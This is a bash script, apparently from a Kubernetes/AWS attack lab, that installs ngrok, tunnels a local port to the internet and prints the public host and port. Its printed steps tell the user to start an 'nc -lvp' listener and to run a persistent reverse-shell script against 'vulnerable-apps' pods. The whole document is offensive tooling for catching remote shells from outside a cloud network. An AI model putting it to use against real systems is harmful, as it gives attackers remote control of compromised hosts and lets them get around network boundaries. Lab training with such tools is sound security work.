#!/bin/bash

# Script to configure ngrok and establish reverse shells accessible from outside AWS

set -e

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
BLUE='\033[0;34m'
NC='\033[0m'

LISTEN_PORT="${1:-4444}"

echo -e "${BLUE}=== ngrok Configuration for Reverse Shells ===${NC}\n"

# Check if ngrok is installed
if ! command -v ngrok &> /dev/null; then
    echo -e "${YELLOW}ngrok is not installed${NC}"
    echo -e "${YELLOW}Installing ngrok...${NC}"
    
    if [[ "$OSTYPE" == "darwin"* ]]; then
        if command -v brew &> /dev/null; then
            brew install ngrok/ngrok/ngrok
        else
            echo -e "${RED}Homebrew is not installed${NC}"
            echo -e "${YELLOW}Download ngrok manually from: https://ngrok.com/download${NC}"
            exit 1
        fi
    else
        curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null
        echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | sudo tee /etc/apt/sources.list.d/ngrok.list
        sudo apt update && sudo apt install ngrok
    fi
fi

# Verify ngrok authentication
if [ -z "$NGROK_AUTHTOKEN" ]; then
    echo -e "${YELLOW}NGROK_AUTHTOKEN is not configured${NC}"
    echo -e "${YELLOW}Configure your token:${NC}"
    echo -e "${GREEN}export NGROK_AUTHTOKEN='your-token-here'${NC}"
    echo -e "${YELLOW}Or run: ngrok config add-authtoken <token>${NC}"
    read -p "Do you have an ngrok token? (y/n): " -n 1 -r
    echo
    if [[ ! $REPLY =~ ^[Yy]$ ]]; then
        echo -e "${YELLOW}Get a free token at: https://dashboard.ngrok.com/get-started/your-authtoken${NC}"
        exit 1
    fi
fi

# Start local listener
echo -e "\n${YELLOW}[1] Starting listener on port $LISTEN_PORT...${NC}"
echo -e "${YELLOW}   In another terminal run: nc -lvp $LISTEN_PORT${NC}"

# Start ngrok
echo -e "\n${YELLOW}[2] Starting ngrok tunnel...${NC}"
ngrok tcp $LISTEN_PORT > /tmp/ngrok.log 2>&1 &
NGROK_PID=$!

sleep 5

# Get public URL
NGROK_URL=$(curl -s http://localhost:4040/api/tunnels | python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
    for tunnel in data.get('tunnels', []):
        if tunnel.get('proto') == 'tcp':
            print(tunnel.get('public_url', ''))
            break
except:
    pass
" 2>/dev/null || echo "")

if [ -z "$NGROK_URL" ]; then
    echo -e "${RED}✗ Could not get ngrok URL${NC}"
    echo -e "${YELLOW}Check logs:${NC}"
    cat /tmp/ngrok.log
    kill $NGROK_PID 2>/dev/null || true
    exit 1
fi

PUBLIC_HOST=$(echo $NGROK_URL | sed 's|tcp://||' | cut -d':' -f1)
PUBLIC_PORT=$(echo $NGROK_URL | sed 's|tcp://||' | cut -d':' -f2)

echo -e "${GREEN}✓ ngrok tunnel established${NC}"
echo -e "${GREEN}  Public URL: $PUBLIC_HOST:$PUBLIC_PORT${NC}"
echo -e "${GREEN}  Full URL: $NGROK_URL${NC}"

# Save information
cat > /tmp/ngrok_info.txt <<EOF
NGROK_URL=$NGROK_URL
PUBLIC_HOST=$PUBLIC_HOST
PUBLIC_PORT=$PUBLIC_PORT
LOCAL_PORT=$LISTEN_PORT
NGROK_PID=$NGROK_PID
EOF

echo -e "\n${BLUE}=== Tunnel Information ===${NC}"
cat /tmp/ngrok_info.txt

echo -e "\n${YELLOW}To establish reverse shells from pods, use:${NC}"
echo -e "${GREEN}./exploitation/reverse-shell-persistent.sh vulnerable-apps $PUBLIC_HOST $PUBLIC_PORT${NC}"

echo -e "\n${YELLOW}To stop ngrok:${NC}"
echo -e "${GREEN}kill $NGROK_PID${NC}"
echo -e "${GREEN}Or press Ctrl+C${NC}"

# Keep running
trap "kill $NGROK_PID 2>/dev/null; exit" INT TERM
wait
